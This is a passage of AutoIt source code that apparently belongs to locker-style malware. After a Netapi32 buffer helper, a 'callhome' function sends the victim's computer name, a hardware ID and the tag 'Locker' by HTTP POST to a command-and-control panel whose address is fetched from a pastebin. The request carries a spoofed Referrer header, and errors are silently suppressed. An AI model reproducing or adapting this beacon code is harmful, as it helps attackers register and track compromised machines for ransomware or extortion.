    Local $aReturn[2] = [ Int($aRet[3]), $sName ]
    Return $aReturn
EndFunc

Func _BufferSize($pBuffer)
    Local $aResult = DllCall("Netapi32.dll", "int", "NetApiBufferSize", "ptr", $pBuffer, "dword*", 0)
    If @error OR  $aResult[0] <> 0 Then Return SetError(@error, @extended, 0)
    Return $aResult[2]
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

Func callhome()
	$data = "pcname=" & @ComputerName & "&hwid=" & $key & "&version=Locker"
	$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("POST", pastebin(), False) ;ex: http://127.0.0.1/panel/settings.php in the pastebins
	$oHTTP.SetRequestHeader("User-Agent", "agent")
	$oHTTP.SetRequestHeader("Referrer", "http://www.yahoo.com")
	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	$oHTTP.Send($data)
	$oReceived = $oHTTP.ResponseText
	ConsoleWrite($oReceived)
EndFunc   ;==>SendPhp

Func MyErrFunc()
	;catching errors.
Endfunc
